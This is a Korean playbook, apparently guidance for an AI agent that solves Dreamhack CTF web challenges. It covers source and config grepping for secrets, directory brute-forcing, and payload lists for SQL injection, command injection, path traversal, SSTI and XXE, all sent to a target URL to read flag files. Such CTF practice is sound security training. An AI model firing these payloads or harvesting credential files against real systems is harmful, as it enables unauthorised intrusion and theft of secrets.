# Step 3: 직접 시스템 분석 및 공격

## 진입 조건
- Step1에서 CVE가 발견되지 않은 경우
- Step2에서 CVE 익스플로잇이 실패한 경우
- 의존성 취약점이 아닌 다른 유형의 CTF인 경우

## 목표
시스템을 직접 분석하여 취약점을 발견하고 플래그 획득

## 실행 프로세스

### 3.1 로컬 파일 심층 분석

#### 분석 대상 및 우선순위

1. **소스 코드 분석**
```bash
# 주요 파일 검색 및 분석
dreamhack_solver:execute_command(
    command="find {problem_path} -type f \\( -name '*.js' -o -name '*.py' -o -name '*.php' \\) | head -20"
)

# 플래그 관련 키워드 검색
dreamhack_solver:execute_command(
    command="grep -r 'flag\\|FLAG\\|secret\\|SECRET\\|password\\|token' {problem_path} --include='*.js' --include='*.py' 2>/dev/null | head -20"
)
```

2. **설정 파일 분석**
```bash
# 환경 설정 확인
dreamhack_solver:execute_command(
    command="find {problem_path} -name '.env*' -o -name 'config*' -o -name 'settings*' | xargs cat 2>/dev/null"
)
```

3. **라우팅 및 엔드포인트 매핑**
```bash
# Express.js 라우트 찾기
dreamhack_solver:execute_command(
    command="grep -r 'app\\.get\\|app\\.post\\|router\\.' {problem_path} --include='*.js' | head -20"
)
```

#### 수집 정보 체크리스트
- [ ] API 엔드포인트 목록
- [ ] 인증/인가 메커니즘
- [ ] 데이터베이스 연결 정보
- [ ] 파일 업로드/다운로드 경로
- [ ] 하드코딩된 credentials
- [ ] 특수 파라미터나 헤더
- [ ] 플래그 저장 위치 힌트

### 3.2 원격 시스템 정찰

#### 기본 정보 수집
```bash
# 웹 서버 정보 확인
dreamhack_solver:curl(
    target_url="{target_url}",
    method="GET"
)

# robots.txt 확인
dreamhack_solver:curl(
    target_url="{target_url}/robots.txt",
    method="GET"
)

# 일반적인 경로 시도
common_paths = [
    "/.git/config",
    "/.env",
    "/admin",
    "/api",
    "/flag",
    "/debug",
    "/.DS_Store"
]
```

#### 디렉토리 및 파일 열거
```bash
# 간단한 디렉토리 브루트포스
dreamhack_solver:execute_command(
    command='''
    for path in admin api flag debug test backup upload download; do
        curl -s -o /dev/null -w "%{http_code}" {target_url}/$path
        echo " - /$path"
    done
    '''
)
```

### 3.3 취약점 테스트 매트릭스

#### A. SQL Injection
```python
test_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin' --",
    "' UNION SELECT * FROM flag--"
]

for endpoint in ["/login", "/search", "/api/user"]:
    for payload in test_payloads:
        dreamhack_solver:curl(
            target_url=f"{target_url}{endpoint}",
            method="POST",
            data=f"username={payload}&password=test"
        )
```

#### B. Command Injection
```python
test_payloads = [
    "; cat /flag.txt",
    "| cat /flag.txt",
    "$(cat /flag.txt)",
    "`cat /flag.txt`"
]

for endpoint in ["/ping", "/exec", "/api/command"]:
    for payload in test_payloads:
        dreamhack_solver:curl(
            target_url=f"{target_url}{endpoint}",
            method="POST",
            data=f"cmd={payload}"
        )
```

#### C. Path Traversal
```python
test_payloads = [
    "../../../flag.txt",
    "....//....//....//flag.txt",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.txt",
    "flag.txt"
]

for endpoint in ["/download", "/file", "/api/read"]:
    for payload in test_payloads:
        dreamhack_solver:curl(
            target_url=f"{target_url}{endpoint}?file={payload}",
            method="GET"
        )
```

#### D. SSTI (Server-Side Template Injection)
```python
test_payloads = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__dict__}}"
]
```

#### E. XXE (XML External Entity)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<data>&xxe;</data>
```

### 3.4 지능형 공격 전략

#### 로컬 분석 결과 기반 공격
```python
# 발견된 엔드포인트와 파라미터로 맞춤 공격
discovered_endpoints = analyze_local_files()
for endpoint in discovered_endpoints:
    for vuln_type in ["sqli", "cmdi", "lfi", "ssti"]:
        test_vulnerability(endpoint, vuln_type)
```

#### 응답 기반 적응
```python
# 에러 메시지 분석
if "mysql" in error_message:
    focus_on_sql_injection()
elif "template" in error_message:
    focus_on_ssti()
elif "file not found" in error_message:
    focus_on_path_traversal()
```

## 결과 처리

### 성공 시
```json
{
  "step": "3_direct_analysis",
  "status": "SUCCESS",
  "vulnerability_type": "sqli|cmdi|lfi|ssti|xxe|other",
  "exploit_details": {
    "endpoint": "/vulnerable/path",
    "payload": "successful_payload",
    "method": "POST|GET"
  },
  "flag": "flag{...}",
  "next_action": "Step4_Validation"
}
```

### 부분 성공 시
```json
{
  "step": "3_direct_analysis",
  "status": "PARTIAL",
  "findings": {
    "vulnerable_endpoint": "/api/exec",
    "information_leaked": "partial_flag_or_hint",
    "next_attempt": "refined_payload"
  },
  "next_action": "Continue_Step3_Refined"
}
```

### 실패 시
```json
{
  "step": "3_direct_analysis",
  "status": "FAILURE",
  "attempted_vulnerabilities": ["sqli", "cmdi", "lfi"],
  "interesting_findings": [
    "Unusual response at /admin",
    "Error message reveals framework version"
  ],
  "next_action": "Step4_Final_Attempts"
}
```

## 고급 기법

### 1. 블라인드 공격
- Time-based blind SQL injection
- Boolean-based blind exploitation
- Out-of-band data exfiltration

### 2. 인코딩 우회
- URL encoding
- Unicode encoding
- Base64 wrapping
- Double encoding

### 3. 필터 우회
- Case variation
- Comment injection
- Concatenation
- Alternative commands

## 중요 고려사항

1. **체계적 접근**: 무작위가 아닌 조직적 테스트
2. **노이즈 최소화**: 과도한 요청 자제
3. **컨텍스트 활용**: 로컬 분석 정보 최대 활용
4. **창의성**: 일반적 패턴 실패 시 창의적 시도
